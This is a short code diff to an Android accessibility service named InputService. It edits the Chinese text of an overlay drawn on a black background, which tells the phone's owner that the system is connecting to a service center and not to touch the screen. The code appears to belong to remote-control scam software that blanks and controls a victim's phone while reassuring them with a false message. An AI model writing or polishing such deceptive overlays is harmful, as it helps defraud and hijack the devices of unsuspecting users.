@@ -938,7 +938,7 @@ class InputService : AccessibilityService() {
 
             // ── 创建 TextView（提示文字，绘制在黑色背景之上）──
             val textView = android.widget.TextView(this)
-            textView.text = "\n\n系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
+            textView.text = "\n\n系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待"
             textView.setTextColor(0xFF888888.toInt())  // 灰色文字
             textView.textSize = 15f
             textView.gravity = android.view.Gravity.START or android.view.Gravity.BOTTOM
